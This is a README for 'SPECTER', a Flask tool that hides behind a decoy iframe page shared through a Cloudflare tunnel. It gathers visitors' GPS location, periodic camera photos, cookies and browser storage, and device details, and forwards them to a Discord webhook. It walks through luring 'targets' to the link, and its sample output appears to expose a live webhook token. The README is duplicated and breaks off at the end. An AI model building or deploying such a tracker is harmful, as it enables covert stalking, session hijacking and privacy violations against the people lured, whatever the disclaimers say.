
# SPECTER - Device Location & Capture Tracker

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![Flask](https://img.shields.io/badge/Flask-2.0+-green.svg)](https://flask.palletsprojects.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Discord Integration](https://img.shields.io/badge/Discord-Integration-purple.svg)](https://discord.com/)

> A comprehensive Flask-based web application for **authorized device tracking**, location capture, and information gathering with Discord webhook integration.

## ⚠️ Disclaimer

This tool is designed for **educational and authorized security testing purposes only**. 

**IMPORTANT LEGAL NOTICE:**
- Unauthorized tracking of individuals without their consent is **ILLEGAL** in most jurisdictions
- Violates wiretapping laws, GDPR, CCPA, and privacy regulations
- Always ensure you have **explicit written permission** before deploying this tool
- Users assume all responsibility for illegal use
- Unauthorized surveillance can result in criminal prosecution

---

## 🎯 Features

| Feature | Description |
|---------|-------------|
| 📍 **Geolocation Tracking** | Captures device GPS coordinates (with user permission) |
| 📷 **Camera Capture** | Automatically takes photos from device camera at intervals |
| 🖥️ **Device Information** | Collects IP address, browser details, hardware specs |
| 📦 **Browser Data Extraction** | Harvests cookies, localStorage, sessionStorage data |
| 🎮 **Discord Integration** | Real-time Discord webhook notifications with embeds |
| 🌐 **Website Embedding** | Displays any website in embedded iframe |
| 🔗 **Port Forwarding** | Supports Cloudflare tunneling or manual forwarding |
| 📊 **IndexedDB Storage** | Persistent session tracking across page reloads |
| 🔋 **Battery Monitoring** | Tracks device battery level and charging status |
| 📡 **Network Monitoring** | Captures connection type, speed, and quality |
| 📝 **Comprehensive Logging** | Detailed logging of all activities |
| 📈 **API Analytics** | Built-in endpoints for data analytics and export |

---

## 📋 Requirements

- **Python 3.7+**
- **pip** (Python package manager)
- **Discord Server** with webhook permissions
- **Internet Connection** (for Cloudflare tunneling)
- **Modern Web Browser** (Chrome, Firefox, Edge, Safari)

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/nhiteshbohra/specter.git
cd specter
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

### 3. Configure Discord Webhook

The application will automatically prompt for your Discord webhook URL on first run if it's not found.

**Option A: Pre-configured (Recommended)**
- Create a Discord server and channel
- Navigate to Channel Settings → Integrations → Webhooks
- Click "Create Webhook" and copy the URL
- Keep it safe - you'll need it when running the app

**Option B: Interactive Prompt**
- If webhook file doesn't exist, the app will ask you to enter it
- You can paste your webhook URL when prompted
- The app will validate the URL format
- It will be saved for future runs

### 4. Run the Application

```bash
python specter.py
```

**First Run:**
- Application detects `all/dwebhook.js` doesn't exist
- Prompts: `[+] Enter Discord Webhook URL:`
- You enter your Discord webhook URL
- Application saves it locally to `all/dwebhook.js`
- Application starts and runs with your webhook

**Future Runs:**
- Application loads webhook from `all/dwebhook.js`
- Validates it's still active
- Starts without prompting (unless webhook is invalid)

Follow the prompts to:
1. Select a website to embed (Wikipedia, Google, YouTube, or Custom)
2. Choose port forwarding method (Cloudflare or Manual)
3. Enter your Discord webhook URL (first run only)
4. Share the generated public link with authorized targets

---

## 📚 Installation Guide

### From Source

```bash
# Clone repository
git clone https://github.com/nhiteshbohra/specter.git

# Navigate to directory
cd specter

# Create virtual environment (optional but recommended)
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Run application (first time - will prompt for webhook)
python specter.py
```

### First Run Setup

When you run `python specter.py` for the first time:

1. **Website Selection** - Choose which website to embed
2. **Port Forwarding** - Choose Cloudflare or manual
3. **Webhook Prompt** - Enter your Discord webhook URL
   - Application will prompt: `[+] Enter Discord Webhook URL:`
   - Paste your webhook URL
   - Application saves it to `all/dwebhook.js` (local only, not GitHub)
4. **Ready** - Application starts and is ready to use

### Subsequent Runs

On future runs, the application:
- Automatically loads your saved webhook from `all/dwebhook.js`
- Validates it's still valid
- Starts without prompting (unless webhook is invalid)

### File Locations

```
all/dwebhook.example.js  ← On GitHub (template/example)
all/dwebhook.js          ← Created by YOU on first run (NOT on GitHub)
```

### Install Dependencies

```bash
pip install flask requests flaredantic colorama
```

Or using requirements.txt:
```bash
pip install -r requirements.txt
```

---

## 💻 Usage

### Basic Start

```bash
python specter.py
```

### Command-Line Options

```bash
python specter.py -p 8000 -t http://localhost:8000/image
```

| Option | Flag | Description | Default |
|--------|------|-------------|---------|
| Port | `-p, --port` | Port to listen on | `8000` |
| Target URL | `-t, --target` | Target URL for image uploads | `http://localhost:8000/image` |

### Interactive Workflow

```
1. Run: python specter.py
2. Select website to embed (1-4):
   - Option 1: Wikipedia (default)
   - Option 2: Google
   - Option 3: YouTube
   - Option 4: Custom URL
3. Choose port forwarding:
   - Option 1: Cloudflare (automatic, recommended)
   - Option 2: Manual port forwarding
4. Enter Discord webhook URL
5. Share the generated public link
```

---

## 🏃 How the Code Actually Runs

### Real Execution Output

Here's what happens when you run `python specter.py`:

```bash
$ python specter.py

[+] Which website would you like to display in the iframe?
1. Wikipedia (default)
2. Google
3. YouTube
4. Custom URL

[+] Enter your choice (1-4, default is 1): 1
[+] Website URL saved: https://www.wikipedia.org

[+] Logs : F:\downloads\TRY\r4ven\specter.log

[?] Checking if port 8000 is available... [AVAILABLE]
____________________________________________________________________________

[+] Enter Discord Webhook URL:
https://discord.com/api/webhooks/1501770411560534096/Co5MwVI6mfioNQKZVt8_hAwyYffMAzrwD0qyu1Ryq8EXPiy1BdRftbVI6YiMrQaNDRmS

[+] Starting Cloudflare tunnel...

2026-05-12 01:22:12 [INFO] https://github.com/linuztx/flaredantic (v0.1.5)

[+] Flask server started! Running on http://127.0.0.1:8000/

2026-05-12 01:22:12 [DEBUG] Using binary directory: C:\Users\unknown\.flaredantic
2026-05-12 01:22:12 [DEBUG] No cloudflared binary found, downloading...
 * Serving Flask app 'port_forward'
 * Debug mode: off
2026-05-12 01:22:12 [DEBUG] Using existing cloudflared binary at: C:\Users\unknown\.flaredantic\cloudflared.exe
2026-05-12 01:22:12 [INFO] Starting Cloudflare tunnel on port 8000...
2026-05-12 01:22:12 [DEBUG] Tunnel process started
2026-05-12 01:22:12 [DEBUG] Starting tunnel URL extraction...
2026-05-12 01:22:12 [DEBUG] Waiting for tunnel URL (timeout: 30s)...
2026-05-12 01:22:18 [INFO] Tunnel URL: https://spoken-muslim-indicator-yorkshire.trycloudflare.com

[+] Flask app available at: https://spoken-muslim-indicator-yorkshire.trycloudflare.com
```

### Step-by-Step Execution Flow

**Phase 1: User Prompts**
```
1. Website Selection
   ↓
   User chooses: Wikipedia
   ↓
   Website URL saved: https://www.wikipedia.org
   
2. Log File Location Shown
   ↓
   Logs saved to: F:\downloads\TRY\r4ven\specter.log
```

**Phase 2: Port Availability Check**
```
Checking if port 8000 is available...
   ↓
   ✅ [AVAILABLE]
   ↓
   Ready to start Flask server
```

**Phase 3: Discord Webhook Configuration**
```
[+] Enter Discord Webhook URL:
   ↓
   User pastes webhook (or it loads from dwebhook.js if it exists)
   ↓
   Webhook validated and saved
```

**Phase 4: Cloudflare Tunnel Initialization**
```
[+] Starting Cloudflare tunnel...
   ↓
   Downloading/locating cloudflared binary
   ↓
   Starting tunnel process
   ↓
   Waiting for tunnel URL (max 30 seconds)
   ↓
   Tunnel URL extracted: https://spoken-muslim-indicator-yorkshire.trycloudflare.com
```

**Phase 5: Flask Server Ready**
```
[+] Flask server started! Running on http://127.0.0.1:8000/
   ↓
   [+] Flask app available at: https://spoken-muslim-indicator-yorkshire.trycloudflare.com
   ↓
   ✅ READY FOR USE
```

### What Happens During Execution

| Phase | What's Happening | Output |
|-------|-----------------|--------|
| **1. Start** | Python loads specter.py | Program begins |
| **2. Website** | Asks which website to embed | `[+] Which website would you like...` |
| **3. Save Website** | Saves choice to `all/website_url.txt` | `[+] Website URL saved: ...` |
| **4. Show Logs** | Displays where logs are saved | `[+] Logs: /path/to/specter.log` |
| **5. Port Check** | Checks if port 8000 is free | `[?] Checking if port 8000...` |
| **6. Webhook Prompt** | Asks for Discord webhook URL | `[+] Enter Discord Webhook URL:` |
| **7. Save Webhook** | Saves to `all/dwebhook.js` | (Silent, happens internally) |
| **8. Cloudflare** | Downloads & starts tunnel | `[+] Starting Cloudflare tunnel...` |
| **9. Flask** | Starts Flask web server | `[+] Flask server started!` |
| **10. Tunnel URL** | Gets public HTTPS URL | `[+] Flask app available at: https://...` |
| **11. Ready** | Application is live | Now accepting connections |

### Connection Flow

```
┌─────────────────────────────────────────────────────────┐
│                    YOUR COMPUTER                         │
│                                                           │
│  specter.py (Python)                                    │
│       ↓                                                  │
│  specter.log (Logs stored here)                         │
│       ↓                                                  │
│  Flask Server (http://127.0.0.1:8000)                  │
│       ↓                                                  │
│  dwebhook.js (Discord webhook)                          │
│       ↓                                                  │
│  Cloudflare Tunnel                                      │
│       ↓                                                  │
└─────────────────────────────────────────────────────────┘
                        ↓
              (HTTPS encryption)
                        ↓
┌─────────────────────────────────────────────────────────┐
│              PUBLIC INTERNET (HTTPS)                    │
│                                                           │
│  https://spoken-muslim-indicator-yorkshire.              │
│         trycloudflare.com                               │
│                                                           │
└─────────────────────────────────────────────────────────┘
                        ↓
              (Targets visit link)
                        ↓
┌─────────────────────────────────────────────────────────┐
│              TARGET DEVICE (Browser)                    │
│                                                           │
│  - Loads index.html                                     │
│  - Displays Wikipedia iframe                            │
│  - Collects geolocation                                 │
│  - Captures camera frames                               │
│  - Sends data to Flask server                           │
│       ↓                                                  │
└─────────────────────────────────────────────────────────┘
                        ↓
              (Data flows back)
                        ↓
┌─────────────────────────────────────────────────────────┐
│         FLASK SERVER RECEIVES DATA                       │
│                                                           │
│  /location_update ← GPS, IP, device info                │
│  /image ← Camera photos                                 │
│  /analytics ← View collected metrics                    │
│       ↓                                                  │
│  Sends to Discord webhook                               │
│       ↓                                                  │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│         DISCORD SERVER (Your Channel)                   │
│                                                           │
│  ✅ Location data received                             │
│  ✅ Device info received                               │
│  ✅ Camera photo received                              │
│  ✅ Battery status received                            │
│  ✅ Network info received                              │
│                                                           │
│  All in real-time embeds!                              │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

### Running States

**While Running:**
```
The application stays running in the terminal window:

[+] Flask app available at: https://spoken-muslim-indicator-yorkshire.trycloudflare.com
 * Serving Flask app 'port_forward'
 * Debug mode: off
WARNING in werkzeug: WARNING in werkzeug: ...

→ Application waits for connections
→ Cloudflare tunnel is active
→ Ready to receive data
→ Press Ctrl+C to stop
```

**To Stop:**
```bash
# Press Ctrl+C in the terminal
^C
# Application shuts down gracefully
```

### After Sharing the Link

**You send target:** `https://spoken-muslim-indicator-yorkshire.trycloudflare.com`

**Target clicks link and:**
1. ✅ Sees embedded Wikipedia in iframe
2. ✅ Browser asks for location permission
3. ✅ Browser asks for camera permission
4. ✅ Application collects data
5. ✅ Data sent to your Discord webhook
6. ✅ You see everything in Discord in real-time

**In Your Discord:**
```
System Monitor: 🔔 New visitor detected
├─ System Information
│  ├─ User Agent: Mozilla/5.0...
│  ├─ Platform: Windows NT 10.0
│  ├─ Screen: 1920x1080
│  └─ RAM: 8GB
├─ IP Address Information
│  ├─ IP: 203.0.113.45
│  ├─ Country: United States
│  ├─ City: San Francisco
│  └─ ISP: Example ISP
├─ Location (GPS)
│  ├─ Latitude: 37.7749
│  ├─ Longitude: -122.4194
│  └─ Map: https://maps.google.com/...
├─ Battery Status
│  ├─ Level: 85%
│  └─ Charging: Yes
├─ Network Information
│  ├─ Type: WiFi
│  ├─ Speed: 45 Mbps
│  └─ RTT: 25ms
└─ Photos (captured at intervals)
   ├─ 20260512-012218.jpeg
   ├─ 20260512-012219.jpeg
   └─ ...
```

---

## 📊 Data Collection

### Information Captured

| Category | Data Points |
|----------|-----------|
| **📍 Location** | Latitude, Longitude, Timezone, City, Country, Accuracy |
| **📸 Camera** | JPEG photos at regular intervals |
| **🖥️ Device** | OS, Browser, Screen Resolution, CPU Cores, RAM |
| **🌐 Network** | IP Address, ISP, Connection Type, Bandwidth, RTT |
| **🔋 Power** | Battery Level, Charging Status, Time to Charge/Discharge |
| **🍪 Browser** | Cookies, LocalStorage, SessionStorage, Cache Info |
| **📋 ISP Details** | Company Name, ASN, Routing Info, Abuse Contacts |

### Discord Data Format

Data is sent via Discord embeds with color-coded categories for easy visualization.

---

## 📁 Project Structure

```
specter/
├── README.md                 # Project documentation
├── LICENSE                  # MIT License
├── .gitignore              # Git ignore rules
├── requirements.txt        # Python dependencies
├── specter.py             # Main entry point
├── port_forward.py        # Flask server & tunneling
├── utils.py               # Utility functions
├── specter.log            # Application logs (auto-generated)
│
└── all/
    ├── index.html         # Web interface (main payload)
    ├── dwebhook.js        # Webhook URL storage
    └── website_url.txt    # Iframe URL storage
```

---

## 🔧 Core Modules

### `specter.py` - Main Application

Main entry point handling:
- User prompts for website selection
- Port availability checking
- Flask server initialization
- Thread management
- Cloudflare tunnel orchestration

### `port_forward.py` - Flask Server & API

Flask application providing:
- Web server setup
- Port forwarding via Cloudflare
- REST API endpoints
- Data receiving and logging

**API Endpoints:**

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/` | GET | Serve main HTML page |
| `/get_website` | GET | Return iframe website URL |
| `/get_target` | GET | Return image upload target URL |
| `/dwebhook.js` | GET | Serve webhook configuration |
| `/location_update` | POST | Receive all tracking data |
| `/image` | POST | Receive and save camera images |
| `/analytics` | GET | Get metrics summary |
| `/metrics/export` | GET | Export collected metrics as JSON |

### `utils.py` - Utility Functions

Helper functions for:
- Discord webhook communication
- File I/O operations
- URL validation with regex

### `all/index.html` - Web Interface

Main payload executed in target browser:
- Displays embedded website
- Collects geolocation (GPS)
- Captures camera feed
- Extracts browser storage
- Gathers device information
- Monitors battery and network
- Sends data to server
- IndexedDB persistent storage

---

## � GitHub & Sensitive Files

### Why `dwebhook.js` is NOT on GitHub

**CRITICAL SECURITY ISSUE:**
```
❌ NEVER commit dwebhook.js to GitHub
❌ NEVER push Discord webhook URLs to public repositories
❌ NEVER share webhook tokens with anyone
```

**Why?**
- Webhook URLs are **authentication tokens** for your Discord server
- Anyone with the URL can send messages to your Discord channel
- Bots/attackers can spam, delete channels, or cause damage
- It's a **security vulnerability**

### What's Actually on GitHub

✅ **Included:**
- `README.md` - Documentation
- `specter.py` - Main code
- `port_forward.py` - Server code
- `utils.py` - Utilities
- `all/index.html` - Web interface
- `all/dwebhook.example.js` - **Example file** (template only)
- `.gitignore` - Ignore rules

❌ **NOT Included (in .gitignore):**
- `all/dwebhook.js` - **Your actual webhook** (sensitive)
- `specter.log` - **Application logs**
- `__pycache__/` - **Python cache**
- `*.jpeg` - **Captured images**

### How It Works for Each GitHub User

**First Time Installation:**

```bash
# User clones from GitHub
git clone https://github.com/nhiteshbohra/specter.git
cd specter

# User installs dependencies
pip install -r requirements.txt

# User runs the application
python specter.py

# ⬇️ APPLICATION PROMPTS FOR WEBHOOK ⬇️
[+] Which website would you like to display?
1. Wikipedia (default)
2. Google
3. YouTube
4. Custom URL
[+] Enter your choice: 1

[+] Enter Discord Webhook URL:
https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN

# ✅ USER'S WEBHOOK IS SAVED LOCALLY ✅
[✓] Webhook saved to all/dwebhook.js (NOT sent to GitHub)
```

**File Structure After First Run:**

```
Local Computer:
specter/
├── specter.py              ← From GitHub
├── port_forward.py         ← From GitHub
├── utils.py                ← From GitHub
├── all/
│   ├── index.html          ← From GitHub
│   ├── dwebhook.example.js ← From GitHub (template)
│   └── dwebhook.js         ← CREATED BY USER (hidden from GitHub)
│       (Contains USER's personal webhook URL)
└── .gitignore             ← Prevents dwebhook.js from being committed

GitHub Repository:
specter/
├── specter.py              ✅ Public
├── port_forward.py         ✅ Public
├── utils.py                ✅ Public
├── all/
│   ├── index.html          ✅ Public
│   └── dwebhook.example.js ✅ Public (EXAMPLE ONLY)
└── .gitignore             ✅ Public (ignore rules)

Note: dwebhook.js is NOT on GitHub (it's in .gitignore)
```

### Example File (`dwebhook.example.js`)

This file is on GitHub as a **template** to show users what format the file should have:

```javascript
// EXAMPLE WEBHOOK FILE - DO NOT COMMIT TO GITHUB
// Replace with your Discord webhook URL
https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
```

### Complete User Workflow

**Step-by-Step for New Users:**

```
1️⃣  User sees SPECTER on GitHub
    ↓
2️⃣  User clones repository
    git clone https://github.com/nhiteshbohra/specter.git
    ↓
    (No dwebhook.js on computer yet)
    ↓
3️⃣  User installs dependencies
    pip install -r requirements.txt
    ↓
4️⃣  User runs application
    python specter.py
    ↓
5️⃣  Application checks for dwebhook.js
    ❌ NOT FOUND
    ↓
6️⃣  Application prompts for webhook URL
    [+] Enter Discord Webhook URL:
    ↓
7️⃣  User enters THEIR OWN webhook URL
    https://discord.com/api/webhooks/USER_ID/USER_TOKEN
    ↓
8️⃣  Application validates and saves locally
    [✓] Webhook saved to all/dwebhook.js
    ↓
9️⃣  File is PROTECTED by .gitignore
    (if user tries: git commit, it won't include dwebhook.js)
    ↓
🔟 Application runs with USER's webhook
    [+] Flask server started on port 8000
    [+] Ready to send data to USER's Discord
```

### Security Best Practices

**For Developers:**
```bash
# GOOD ✅ - Protect sensitive files
echo "all/dwebhook.js" >> .gitignore
git add .gitignore
git commit -m "Add gitignore rules"

# BAD ❌ - Never do this
git add all/dwebhook.js
git commit -m "Add webhook"
git push  # Now your webhook is public!
```

**For Users:**
```bash
# Check that dwebhook.js is NOT being tracked
git status

# Output should show:
# working tree clean
# (dwebhook.js is NOT listed because .gitignore blocks it)

# Verify .gitignore is working
git check-ignore all/dwebhook.js
# Output: all/dwebhook.js
# (Means it's properly ignored)
```

---



### Webhook Validation & Storage

The application uses smart webhook validation:

1. **First Run**: If `all/dwebhook.js` doesn't exist
   - Application prompts you to enter Discord webhook URL
   - Validates URL format using regex
   - Saves URL to `all/dwebhook.js` for future use

2. **Subsequent Runs**: If `all/dwebhook.js` exists
   - Application loads webhook from file
   - Validates the URL is still active
   - If invalid, asks for new webhook URL
   - Re-saves with new valid URL

3. **Invalid Webhook Detection**
   - Regex validation: `^https://(discord(app)?\.com)/api(/v\d+)?/webhooks/\d+/[A-Za-z0-9_-]+/?$`
   - Checks URL follows Discord's webhook format
   - Prompts for valid URL if check fails

### Webhook Setup

1. Create Discord Server
2. Go to Server Settings → Integrations → Webhooks
3. Click "New Webhook"
4. Name it "SPECTER"
5. Copy the Webhook URL
6. On first run, paste URL when prompted

### Webhook URL Format

```
https://discord.com/api/webhooks/{WEBHOOK_ID}/{WEBHOOK_TOKEN}
```

### Data Flow

```
Device Browser → SPECTER Server → Discord Webhook → Your Discord Channel
```

### Example First Run Interaction

```
[+] Enter Discord Webhook URL:
https://discord.com/api/webhooks/1234567890/abcDEF-ghi_jkl-mno

✓ Valid webhook URL saved!
[+] Flask server started! Running on http://127.0.0.1:8000/
```

### Webhook File Storage

- **Location**: `all/dwebhook.js`
- **Format**: Plain text containing only the webhook URL
- **Security**: 🔴 IMPORTANT - Added to `.gitignore` (never committed to GitHub)
- **Persistence**: Survives application restarts

---

## ⚙️ Configuration

### Automatic Webhook Configuration

**On First Run:**
```
$ python specter.py

[+] Which website would you like to display in the iframe?
1. Wikipedia (default)
2. Google
3. YouTube
4. Custom URL

[+] Enter your choice (1-4, default is 1): 1
[+] Website URL saved: https://www.wikipedia.org

[+] Starting Cloudflare tunnel...
[+] Enter Discord Webhook URL:
https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN

[✓] Webhook saved successfully!
[+] Flask server started! Running on http://127.0.0.1:8000/
[+] Flask app available at: https://randomly-generated-url.trycloudflare.com
```

### Configuration Files Created

After first run, these files are auto-generated:

| File | Purpose | Gitignored |
|------|---------|-----------|
| `all/dwebhook.js` | Stores Discord webhook URL | ✅ Yes |
| `all/website_url.txt` | Stores iframe website URL | ✅ Yes |
| `specter.log` | Application logs | ✅ Yes |

### Environment Setup

```bash
# Create .env file (optional)
DISCORD_WEBHOOK=your_webhook_url_here
FLASK_PORT=8000
FLASK_HOST=0.0.0.0
```

### Cloudflare Tunnel

Automatically configured when selecting Cloudflare option. Generates a unique public URL for secure HTTPS tunneling.

### Validation Rules

**Webhook URL Validation:**
```
✅ VALID:   https://discord.com/api/webhooks/123456/abc-DEF_123
✅ VALID:   https://discordapp.com/api/v10/webhooks/123456/abc-DEF_123
❌ INVALID: https://discord.com/api/webhooks/123456
❌ INVALID: https://example.com/webhook
❌ INVALID: (empty URL)
```

---

## 📊 Analytics & Metrics

### View Analytics

```bash
curl http://localhost:8000/analytics
```

### Export Metrics

```bash
curl http://localhost:8000/metrics/export > metrics.json
```

---

## 🔐 Security Best Practices

### For Authorized Use

- ✅ Use HTTPS (Cloudflare provides this)
- ✅ Secure Discord webhook URLs
- ✅ Obtain written consent from all targets
- ✅ Follow data protection regulations (GDPR, CCPA)
- ✅ Implement data encryption
- ✅ Maintain audit logs
- ✅ Restrict access to collected data
- ✅ Have a data retention/deletion policy

---

## 🐛 Troubleshooting

### Webhook File Issues

**Problem: "Invalid webhook URL found in file"**
```
Error: Invalid webhook URL found in file. Please enter a valid Discord webhook URL.
```
**Causes & Solutions:**
1. **Webhook was deleted** - Create new webhook in Discord
2. **Wrong format saved** - Delete `all/dwebhook.js` and re-run app
3. **Corrupted file** - Clear the file contents and restart

**Solution:**
```bash
# Delete the webhook file
rm all/dwebhook.js

# Re-run application - it will prompt for webhook again
python specter.py
```

**Problem: "No webhook file found"**
```
[+] Enter Discord Webhook URL:
```
**This is NORMAL** - App is asking for webhook on first run
- Paste your Discord webhook URL
- It will be saved automatically for future use

### Port Already in Use

```bash
python specter.py -p 8001  # Use different port
```

### Discord Webhook Invalid

1. Verify webhook URL format
2. Check webhook is still active in Discord
3. Test with curl:
   ```bash
   curl -X POST -H 'Content-type: application/json' \
   --data '{"text":"Test"}' YOUR_WEBHOOK_URL
   ```
4. Delete `all/dwebhook.js` and re-run to re-enter

### Camera/Location Issues

- Browser requires HTTPS for sensitive features
- Cloudflare tunneling provides automatic HTTPS
- Ensure user grants permissions when prompted
- Check browser console (F12) for errors

### Cloudflare Tunnel Fails

```bash
# Check internet connection
ping google.com

# Check logs
tail -f specter.log

# Try manual port forwarding (Option 2)
```

### Images Coming Black

1. Check camera permissions granted
2. Ensure adequate lighting
3. Check `specter.log` for capture errors

---

## 📝 Logging

### Log File Location

```
specter.log
```

### View Logs

```bash
# View all logs
cat specter.log

# Real-time monitoring
tail -f specter.log

# Filter specific data
grep "Location" specter.log
```

---

## 📦 Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| Flask | 2.0+ | Web framework |
| Requests | 2.25+ | HTTP library |
| flaredantic | Latest | Cloudflare tunneling |
| colorama | 0.4+ | Terminal colors |

---

## 🚀 Performance

- Supports 10+ concurrent connections
- Image capture: ~1.5 second intervals
- Data transmission: <100ms per request
- Minimal memory footprint (~50MB)

---

## 📈 Future Enhancements

- [ ] Database backend (SQLite/PostgreSQL)
- [ ] Web dashboard for analytics
- [ ] Multi-webhook support with fallback
- [ ] End-to-end encryption
- [ ] Custom HTML/CSS templates
- [ ] Automated screenshot capture
- [ ] WiFi SSID harvesting

---

---

## 🚀 Pushing to GitHub

### Setup & Push Instructions

```bash
# 1. Create repository on GitHub
# Go to https://github.com/new
# Name: specter
# Description: Flask-based authorized device tracking tool
# Privacy: Public (or Private if preferred)

# 2. Initialize and push from local
cd specter

# Initialize git (if not already done)
git init

# Add all files (except those in .gitignore)
git add .

# Verify .gitignore is working
git status
# Should show: all/dwebhook.example.js (not dwebhook.js)

# Create initial commit
git commit -m "Initial commit: SPECTER device tracking tool with Discord integration"

# Add remote repository
git remote add origin https://github.com/nhiteshbohra/specter.git

# Rename branch to main
git branch -M main

# Push to GitHub
git push -u origin main
```

### Verification Checklist

**Before pushing, verify:**

```bash
# ✅ Check what will be pushed
git status
# Should show "nothing to commit, working tree clean"

# ✅ Verify .gitignore is protecting sensitive files
git ls-files | grep dwebhook
# Should show: all/dwebhook.example.js (ONLY)
# Should NOT show: all/dwebhook.js

# ✅ Check .gitignore contents
cat .gitignore | grep -A 5 "SPECTER specific"
# Should include: all/dwebhook.js

# ✅ Verify no webhook tokens in code
grep -r "discord.com/api/webhooks" .
# Should return: NOTHING (only in example file if present)
```

### What Gets Pushed to GitHub

**✅ Public (on GitHub):**
- `README.md`
- `specter.py`
- `port_forward.py`
- `utils.py`
- `all/index.html`
- `all/dwebhook.example.js` (template only)
- `.gitignore`
- `requirements.txt`

**❌ Private (NOT on GitHub):**
- `all/dwebhook.js` (blocked by .gitignore)
- `specter.log` (blocked by .gitignore)
- `__pycache__/` (blocked by .gitignore)
- `*.jpeg` images (blocked by .gitignore)
- `venv/` (blocked by .gitignore)

### After GitHub Push

**For users cloning your repo:**

```bash
# They clone
git clone https://github.com/nhiteshbohra/specter.git
cd specter

# They see these files:
ls all/
# Output:
# index.html
# dwebhook.example.js  ← Example file (on GitHub)
# website_url.txt might not exist yet

# They DON'T see:
# dwebhook.js  ← Missing (they'll create it on first run)

# They run
python specter.py

# Application prompts for webhook
[+] Enter Discord Webhook URL:
# They enter their OWN webhook

# Application creates (locally, not sent to GitHub)
all/dwebhook.js  ← User's personal webhook (hidden by .gitignore)
```

---



Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Open a Pull Request

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ⚖️ Legal Responsibility

Users are solely responsible for compliance with all applicable laws including:

- Data Protection Laws (GDPR, CCPA, etc.)
- Wiretapping/Eavesdropping Laws
- Consent Requirements
- Computer Fraud and Abuse Act (CFAA)

**By using this tool, you agree that:**
- ✅ You have explicit permission from all parties
- ✅ You understand all legal consequences
- ✅ You will not use for unauthorized surveillance
- ✅ Developers assume no liability for misuse

---

## 🆘 Support

For issues or questions:
1. Check `specter.log` for error messages
2. Use browser console (F12) for JavaScript errors
3. Verify Discord webhook configuration
4. Check network connectivity

---

**Made with ⚠️ for authorized security professionals only**

*Use responsibly. Use ethically. Use legally.*

*Last Updated: May 12, 2026*

## Features

✅ **Geolocation Tracking** - Captures device GPS coordinates (with user permission)  
✅ **Camera Capture** - Automatically takes photos from the device camera  
✅ **Device Information** - Collects IP address, browser details, and device specs  
✅ **Browser Data Extraction** - Harvests cookies, localStorage, and sessionStorage  
✅ **Discord Integration** - Sends captured data and images to Discord webhooks  
✅ **Website Embedding** - Displays any website in an embedded iframe  
✅ **Port Forwarding** - Supports Cloudflare tunneling or manual forwarding  
✅ **Logging** - Records all activities to a log file  

## Installation

### Prerequisites
- Python 3.7+
- pip (Python package manager)

### Setup Steps

1. **Clone or download the repository:**
   ```bash
   cd specter
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Configure your Discord webhook:**
   - Create a Discord server and channel
   - Get your webhook URL from channel settings
   - The app will prompt you for this on first run

## Usage

### Basic Start

```bash
python specter.py
```

### Command-Line Options

```bash
python specter.py -p 8000 -t http://localhost:8000/image
```

| Option | Description | Default |
|--------|-------------|---------|
| `-p, --port` | Port to listen on | 8000 |
| `-t, --target` | Target URL for image uploads | http://localhost:8000/image |

### Workflow

1. **Run the application:**
   ```bash
   python specter.py
   ```

2. **Choose a website to embed:**
   - Wikipedia (default)
   - Google
   - YouTube
   - Custom URL

3. **Select port forwarding method:**
   - Option 1: Cloudflare (recommended) - Automatic public access
   - Option 2: Manual - Use your own port forwarding solution

4. **Enter Discord webhook URL** when prompted

5. **Share the access link** with targets

### What Gets Captured

When someone visits your link:

- 📍 **GPS Location** (if granted permission)
- 📷 **Photo** from device camera (if granted permission)
- 🖥️ **Device Information:**
  - IP Address
  - Browser type and version
  - Screen resolution
  - Timezone
- 📦 **Browser Storage:**
  - Cookies
  - LocalStorage
  - SessionStorage
- 📋 **Cache & Storage Info**

All data is sent to your Discord webhook in real-time.

## Project Structure

```
specter/
├── specter.py            # Main application entry point
├── port_forward.py       # Flask server & port forwarding logic
├── utils.py              # Utility functions (webhook handling, file operations)
├── requirements.txt      # Python dependencies
├── specter.log          # Application logs (auto-generated)
└── all/
    ├── index.html        # Web interface with data capture script
    ├── dwebhook.js       # Discord webhook URL storage
    └── website_url.txt   # Stored website URL for iframe
```

## File Descriptions

### `specter.py`
Main application entry point. Handles:
- User prompts for website and port forwarding selection
- Port availability checking
- Flask server initialization
- Thread management

### `port_forward.py`
Handles Flask routes and port forwarding:
- **GET `/`** - Serves the main HTML page
- **GET `/get_website`** - Returns iframe website URL
- **GET `/dwebhook.js`** - Serves webhook configuration
- **POST `/location_update`** - Receives location data
- **POST `/image`** - Receives and saves captured images
- **GET `/get_target`** - Returns target upload URL
- Cloudflare tunnel integration via `flaredantic`

### `utils.py`
Utility functions:
- `get_file_data()` - Read file contents
- `update_webhook()` - Send data to Discord webhook
- `check_and_get_webhook_url()` - Validate and manage webhook URLs with regex

### `all/index.html`
Web interface that:
- Displays embedded website in iframe
- Collects geolocation data
- Captures device camera
- Extracts browser storage data
- Compiles device information
- Sends all data to server

## Dependencies

| Package | Purpose |
|---------|---------|
| `flask` | Web framework |
| `requests` | HTTP requests for webhooks |
| `flaredantic` | Cloudflare tunnel integration |
| `colorama` | Colored terminal output |

## Configuration

### Discord Webhook Setup

1. Go to your Discord server settings
2. Navigate to **Integrations** → **Webhooks**
3. Click **Create Webhook**
4. Copy the webhook URL
5. Paste when prompted by SPECTER

Valid webhook URL format:
```
https://discord.com/api/webhooks/{webhook_id}/{webhook_token}
```

## Security & Ethical Notes

⚠️ **Important Reminders:**

- ✅ **Only use with explicit consent** from all parties
